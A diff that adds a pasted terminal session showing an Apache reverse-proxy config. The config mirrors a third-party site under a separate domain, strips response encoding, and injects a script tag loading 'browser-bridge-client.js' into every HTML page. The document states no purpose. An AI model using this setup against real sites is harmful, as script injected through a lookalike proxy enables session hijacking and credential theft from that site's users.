@@ -1,0 +1,33 @@
+root@01:/etc/apache2/sites-enabled# cat proxied.conf
+<IfModule mod_ssl.c>
+
+  <VirtualHost *:443>
+      ServerName domain.youcontrol.com
+
+        DocumentRoot /var/www/html/proxied
+        ErrorLog ${APACHE_LOG_DIR}/proxiederror.log
+        CustomLog ${APACHE_LOG_DIR}/accessproxied.log combined
+
+# The wildcard setup
+SSLCertificateFile /etc/ssl/crt/cert.crt
+SSLCertificateKeyFile /etc/ssl/crt/server.key
+SSLCertificateChainFile /etc/ssl/crt/intermediates.crt
+SSLProxyEngine On
+
+      # Remove encoding to allow substitution
+      RequestHeader unset Accept-Encoding
+
+      # Proxy everything
+      ProxyPreserveHost Off
+      ProxyPass / https://injection.site.com
+      ProxyPassReverse / https://injection.site.com/
+      RequestHeader set Host "injection.site.com"
+
+      # Configure output filter for HTML only
+      AddOutputFilterByType SUBSTITUTE text/html
+
+      # Inject script tag
+      Substitute "s|</head>|<script src=\"https://domain.youcontrol.com/browser-bridge-client.js\"></script></head>|in"
+  </VirtualHost>
+
+root@RIVSPROD01:/etc/apache2/sites-enabled#
